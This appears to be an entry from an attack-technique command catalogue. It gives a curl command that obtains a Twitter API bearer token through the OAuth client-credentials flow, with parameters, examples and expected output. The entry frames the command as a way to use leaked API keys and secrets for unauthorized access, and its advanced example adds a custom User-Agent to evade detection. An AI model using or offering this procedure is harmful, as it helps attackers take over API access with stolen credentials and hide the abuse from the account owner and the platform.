---
id: 5d45b96a-03cc-4075-bd28-142c989b334c
name: curl-twitter-api-bearer-token
type: command
executor: bash
data: >-
  curl -u "$_API_KEY:$_API_SECRET" --data 'grant_type=client_credentials'
  'https://api.twitter.com/oauth2/token'
output: null
created_at: '2023-04-06T03:55:52.349304+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api-auth
  - twitter
verified: true
validated: true
---

# curl-twitter-api-bearer-token

## Command

```bash
curl -u "$_API_KEY:$_API_SECRET" --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

## Description

This command requests a bearer token from the Twitter API using OAuth 2.0 client credentials flow. It authenticates via HTTP Basic Auth with the API key and secret, enabling application-level API access for read/write operations without user context. Use this after obtaining leaked credentials to gain unauthorized API access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_API_KEY | The Twitter API consumer key (leaked value) | Yes |
| $_API_SECRET | The Twitter API consumer secret (leaked value) | Yes |
| -u | Specifies Basic Auth format (key:secret) | Built-in |
| --data | POST data payload with grant_type | Built-in |

## Examples

### Basic Usage

```bash
curl -u "abc123:xyz789" --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

### Advanced Usage

```bash
curl -u "$_API_KEY:$_API_SECRET" --data 'grant_type=client_credentials' -H "User-Agent: Custom" 'https://api.twitter.com/oauth2/token'
```

Add headers like User-Agent to mimic legitimate requests and evade basic detection.

## Expected Output

Successful response is JSON indicating the bearer token:

```json
{
  "token_type": "bearer",
  "access_token": "AAAAAAAAAAAAAAAAAAAA%2Fexample%3D%3Dlong%3D%3Dtoken%3D%3D"
}
```

Error example (invalid credentials):

```json
{
  "errors": [
    {
      "code": 32,
      "message": "Could not authenticate you."
    }
  ]
}
```

## Related

- [[procedures/Authenticate-with-Twitter-API-Using-Leaked-Key-and-Secret]]
- [[Unsecured Credentials]] (Unsecured Credentials)
